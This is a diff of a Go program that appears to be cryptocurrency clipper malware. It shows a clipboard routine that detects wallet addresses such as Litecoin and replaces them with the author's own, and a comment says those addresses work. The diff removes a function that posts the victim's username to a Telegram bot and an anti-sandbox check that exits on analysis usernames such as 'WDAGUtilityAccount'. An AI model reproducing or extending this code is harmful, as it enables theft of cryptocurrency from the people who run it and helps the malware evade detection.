@@ -3,10 +3,7 @@ package main
 import (
 	"fmt"
 	"log"
-	"net/http"
-	"net/url"
 	"os"
-	"os/user"
 	"path/filepath"
 	"regexp"
 
@@ -16,7 +13,6 @@ import (
 
 // placeholders for now (except for chat id, bot token and crypto addresses those work)
 const (
-	Startup  = true
 	avm      = true
 	tg       = true
 	chatid   = "chatid"
@@ -68,42 +64,6 @@ func clip() {
 			fmt.Printf("LTC DETECTED")
 			clipboard.Set(LTC)
 		}
-	}
-}
-
-func telegram() {
-
-	user, err := user.Current()
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	message := ("New File ran, Username:" + user.Username + "\n")
-	telegramurl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", bottoken)
-	data := url.Values{}
-	data.Set("chat_id", chatid)
-	data.Set("text", message)
-	resp, err := http.PostForm(telegramurl, data)
-	if err != nil {
-		fmt.Println("failed too send info too telegram", err)
-	}
-	defer resp.Body.Close()
-}
-
-func antivm() {
-	user, err := user.Current()
-	if err != nil {
-		log.Fatal(err)
-	}
-	// yes i know blocking usernames is retarded, ill fix it when i feel like it
-	blockedusers := map[string]bool{
-		"admin":              true,
-		"administrator":      true,
-		"WDAGUtilityAccount": true,
-	}
-
-	if blockedusers[user.Username] {
-		os.Exit(0)
 	}
 }
 
